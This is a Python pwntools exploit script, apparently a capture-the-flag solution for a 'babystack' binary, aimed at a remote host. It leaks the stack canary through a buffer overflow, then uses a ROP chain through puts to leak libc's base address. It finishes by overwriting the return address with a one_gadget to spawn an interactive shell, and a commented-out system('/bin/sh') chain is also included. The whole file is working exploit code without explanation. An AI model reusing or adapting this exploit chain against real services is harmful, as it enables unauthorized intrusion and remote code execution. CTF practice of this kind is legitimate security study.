
from pwn import *
from leak_to_address import *


def fun(a):
    r.recvuntil('>> ')
    r.sendline(str(a))


context.terminal = ['gnome-terminal', '-e']
# context.terminal = ['tmux', 'splitw', '-h']

# r = remote('127.0.0.1', 1234)
r = remote('111.198.29.45', 51020)
# r = process('./babystack')
elf = ELF('./babystack')
libc = ELF('./libc-2.23.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

pop_rdi_ret = 0x0400a93
main_addr = 0x0400908
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
libc_puts = libc.sym['puts']
one_gadget = 0x45216

fun(1)
r.sendline('A' * 0x88)
fun(2)
r.recvuntil('A' * 0x88 + '\n')
leak = r.recvuntil('\n')
L = Leak_address('\x00' + leak, 64)
print(leak, L.print_leak())
canary = L.leak_to_64_int(0)
log.success('canary found: ' + hex(canary))
# gdb.attach(r)

fun(1)
p = 'A' * 0x88
p += p64(canary)
p += 'A' * 8
p += p64(pop_rdi_ret)
p += p64(puts_got)
p += p64(puts_plt)
p += p64(main_addr)
r.sendline(p)
fun(3)
leak = r.recvuntil('\n')[:-1]
L = Leak_address(leak, 64)
# print(leak, L.print_leak())
libc_base = L.leak_to_64_int(0) - libc_puts
log.success('libc base: ' + hex(libc_base))

#
# /lib/x86_64-linux-gnu/libc.so.6
#
# addr_binsh = libc.search('/bin/sh').next() + libc_base
# addr_system = libc.symbols['system'] + libc_base
# p = 'A' * 0x88
# p += p64(canary)
# p += 'B' * 8
# p += p64(pop_rdi_ret)
# p += p64(addr_binsh)
# p += p64(addr_system)

one_gadget = libc_base + one_gadget

p = 'A' * 0x88
p += p64(canary)
p += 'B' * 8
p += p64(one_gadget)
fun(1)
r.sendline(p)
fun(3)

r.interactive()
